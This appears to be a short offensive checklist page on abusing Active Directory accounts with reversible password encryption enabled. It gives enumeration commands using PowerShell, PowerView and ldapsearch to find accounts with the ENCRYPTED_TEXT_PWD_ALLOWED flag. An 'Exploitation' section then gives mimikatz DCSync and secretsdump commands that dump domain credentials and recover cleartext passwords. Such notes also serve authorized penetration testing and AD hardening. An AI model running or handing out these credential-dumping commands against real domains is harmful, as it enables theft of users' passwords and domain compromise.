
`Reversible password encryption` is a way of storing passwords in Active Directory that allows them to be recovered in cleartext, not only as hashes. If the account has `ENCRYPTED_TEXT_PWD_ALLOWED` enabled and you gain the ability to replicate credentials or read `unicodePwd` through workflows such as DCSync, `secretsdump`, or `mimikatz`, the password can be recovered in cleartext. There is no need to crack hashes.

In Active Directory this is controlled through the flag `ENCRYPTED_TEXT_PWD_ALLOWED (0x80 / 128)`, which enables reversible storage of the user's password. It is reflected in the `userAccountControl` attribute.

- [ ] Enumeration

```powershell
# AD
Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl | Select-Object SamAccountName, userAccountControl

# Powerview
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol

# Ldapsearch
ldapsearch -x -H ldap://IP_DC -D "user@domain.local" -w 'pass' -b "DC=domain,DC=local" '(&(userAccountControl:1.2.840.113556.1.4.803:=128)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))' sAMAccountName | grep '^sAMAccountName:' | awk '{print $2}'
```

- [ ] Exploitation

> There is no need to crack hashes. Cleartext can be recovered through the following paths:

```powershell
.\mimikatz.exe "lsadump::dcsync /user:DOMAIN\user" "exit"
```

```powershell
secretsdump.py -outputfile domain_hashes -just-dc domain/user@IP_DC 
```

> You will get `.cleartext` output if the reversible flag is enabled.
